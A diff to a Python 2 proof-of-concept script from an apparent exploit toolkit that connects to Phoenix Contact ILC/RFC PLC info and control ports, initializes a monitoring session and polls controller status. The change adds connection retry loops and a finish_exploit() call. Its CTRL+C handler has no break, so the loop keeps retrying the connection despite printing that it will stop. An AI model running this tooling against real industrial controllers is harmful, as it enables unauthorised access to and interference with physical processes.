@@ -31,7 +31,7 @@ This POC will print out the current status of the PLC, continuously every 0.1 se
 Works on ILC 15x ETH, partly on RFC 43x, partly on ILC 39x
 '''
 import sys, socket, binascii, time, os, select, re
-from fungsi import warna
+from fungsi import warna, finish_exploit
 import sub_menu3 as back
 
 IP=''
@@ -107,7 +107,19 @@ if not is_ipv4(IP):
 	
 ## - initialization, this will get the PLC type, Firmware version, build date & time
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((IP,infoport))
+while True:
+    try:
+        s.connect((IP,infoport))
+        break
+
+    except socket.error as e:
+        print "\nSomething went wrong : ",e
+        raw_input("\n press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
+        back.menu['menu_utama']()
+
+    except(KeyboardInterrupt):
+        print(warna.merah + "\n[x] " + warna.tutup + "{0}CTRL+C{1} Detected, force program to stop !\n".format(warna.merah, warna.tutup))
+
 
 print(warna.hijau + "\n[*] " + warna.tutup + "Initializing PLC")
 print '------------------'
@@ -132,7 +144,17 @@ raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
 
 ########## CONTROL PHASE ####### Start monitoring with loop on port 41100
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((IP,controlport))
+while True:
+    try:
+        s.connect((IP,controlport))
+        break
+
+    except socket.error as e:
+        print "\nSomething went wrong : ",e
+        raw_input("\n press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
+        back.menu['menu_utama']()
+
+#s.connect((IP,controlport))
 # First init phase (sending things like 'Ade.Remoting.Services.IProConOSControlService2' and 'Ade.Remoting.Services.ISimpleFileAccessService3', 21 packets)
 initMonitor(s)
 # Query packet
@@ -187,6 +209,5 @@ while True:
         else:
             startme = 1
     #'''
-print(warna.hijau + "\n[*] " + warna.tutup + "All done.")
-raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
+finish_exploit()
 back.menu['menu_utama']()
